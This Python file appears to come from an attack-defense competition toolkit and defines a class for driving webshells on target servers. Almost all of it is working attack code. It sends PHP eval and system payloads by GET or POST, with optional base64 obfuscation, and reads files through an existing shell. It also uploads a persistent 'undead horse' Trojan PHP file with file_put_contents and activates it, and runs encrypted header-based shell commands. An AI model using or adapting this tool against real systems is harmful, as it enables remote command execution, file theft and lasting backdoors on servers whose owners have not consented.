from libs.Misc import Log, Config
from horse.HeaderHorse import HeaderHorse
import requests
import base64
import importlib


class ShellRequest:
    def __init__(self):
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'
        }
        self.session = requests.session()

    def pre_operate(self, target):
        """操作shell之前的操作，可用于登录"""
        # ip, port = target['ip'], target['port']
        # data = {'user':'admin','pwd':'password'}
        # url = 'http://{}:{}/login.php'.format(ip, port)
        # try:
        #     self.session.post(url, data=data, headers=self.headers, proxies=Config.proxy, timeout=2)
        # except requests.Timeout:
        #     pass
        pass

    @staticmethod
    def process_response(response):
        result = None
        if response.status_code == 200:
            result = response.content.decode('utf-8', 'replace').replace('\n', ' ')
        elif response.status_code == 404:
            Log.red('404 Not Found.')
        else:
            Log.red('Requests error, code: {}.'.format(response.status_code))
        return result

    def eval_system_shell(self, target, shell, payload):
        shell_type = shell['type']
        shell_method = shell['method']
        shell_password = shell['password']
        shell_path = shell['path']
        ip, port = target['ip'], target['port']
        result, response = None, None

        self.pre_operate(target)

        if shell_type == 'eval':
            payload = "printf('*----START----*');" + payload + ";printf('*----END----*');"
            if Config.eval_base64_coding:
                payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())
        else:
            payload = "echo '*----START----*';" + payload + ";echo '*----END----*';"

        if shell_method == 'GET':
            url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
            url = url_.format(ip, port, shell_path, shell_password, payload)
            try:
                response = self.session.get(url, headers=self.headers, proxies=Config.proxy, timeout=2)
            except requests.Timeout:
                Log.red('Connect failed, Timeout.')

        elif shell_method == "POST":
            url = "http://{}:{}/{}".format(ip, port, shell_path)
            data = {shell_password: payload}
            try:
                response = self.session.post(url, data=data, headers=self.headers, proxies=Config.proxy, timeout=2)
            except requests.Timeout:
                Log.red('Connect failed, Timeout.')

        if response:
            result = self.process_response(response)
            if result or result == '':
                try:
                    result = result.split("*----START----*")[1].split("*----END----*")[0]
                except:
                    return Log.red('Request ok but eval error')
        return result

    def readfile_shell(self, target, shell, filepath):
        shell_method = shell['method']
        shell_password = shell['password']
        shell_path = shell['path']
        ip, port = target['ip'], target['port']
        result, response = None, None

        self.pre_operate(target)
        if shell_method == 'GET':
            url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
            url = url_.format(ip, port, shell_path, shell_password, filepath)
            try:
                response = self.session.get(url, headers=self.headers, proxies=Config.proxy, timeout=2)
            except requests.Timeout:
                Log.red('Connect failed, Timeout.')

        elif shell_method == "POST":
            url = "http://{}:{}/{}".format(ip, port, shell_path)
            data = {shell_password: filepath}
            try:
                response = self.session.post(url, data=data, headers=self.headers, proxies=Config.proxy, timeout=2)
            except requests.Timeout:
                Log.red('Connect failed, Timeout.')

        if response:
            result = self.process_response(response)
        return result

    def upload_horse(self, target, shell, horse_name):
        shell_method = shell['method']
        shell_password = shell['password']
        shell_path = shell['path']
        ip, port = target['ip'], target['port']

        horse_content = open("horse/"+horse_name+'/Horse.php', 'rb').read()
        horse_content = horse_content.replace(b'.config_cdut.php', Config.undead_horse_name.encode())
        horse_b64content = base64.b64encode(horse_content).decode()
        
        self.pre_operate(target)
        if shell_method == "GET":
            payload = "var_dump(file_put_contents('Horse.php', base64_decode(file_get_contents('php://input'))));"
        else:
            payload = "var_dump(file_put_contents('Horse.php',base64_decode('{}')));".format(horse_b64content)
        if Config.eval_base64_coding:
            payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())

        if shell_method == 'GET':
            url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
            url = url_.format(ip, port, shell_path, shell_password, payload)
            data = horse_b64content
        else:
            url = "http://{}:{}/{}".format(ip, port, shell_path)
            data = {shell_password: payload}
        try:
            response = self.session.post(url, data=data, headers=self.headers, proxies=Config.proxy, timeout=2)
        except requests.Timeout:
            Log.red('Connect failed, Timeout.')
            return False

        if "int({})".format(len(horse_content)) in response.content.decode('utf-8', 'replace'):
            Log.green("Upload ok", '  ')
            upload_horse_path = shell_path.split('?')[0].split('/')
            upload_horse_path.pop()
            upload_horse_path = '/'.join(upload_horse_path)

            horse_py = importlib.import_module('horse.{}.Horse'.format(horse_name))
            # 激活木马，返回shell
            result = horse_py.activate(ip, port, upload_horse_path)
            return result
        else:
            Log.red("Upload Failed")
            return False

    def header_shell(self, target, shell, payload):
        shell_path = shell['path']
        ip, port = target['ip'], target['port']
        payload += ';' if payload[-1] != ';' else ''

        url = "http://{}:{}/{}".format(ip, port, shell_path)
        response = HeaderHorse.operate(url, payload)
        result = self.process_response(response)
        if result or result == '':
            try:
                result = result.split("*----START----*")[1].split("*----END----*")[0]
                result = HeaderHorse.decrypt(result)
            except:
                return Log.red('Request ok but eval error')
        return result

    def make_request(self, target, method, path, data=None):
        header = Config.custom_request_headers
        url = 'http://{}:{}/{}'.format(target['ip'], target['port'], path)
        try:
            if method == 'GET':
                response = self.session.get(url, headers=header, proxies=Config.proxy, timeout=2)
            else:
                header['Content-Type'] = 'application/x-www-form-urlencoded'
                response = self.session.post(url, headers=header, data=data, proxies=Config.proxy, timeout=2)
            result = self.process_response(response)
            return result
        except requests.Timeout:
            Log.red('Connect failed, Timeout.')
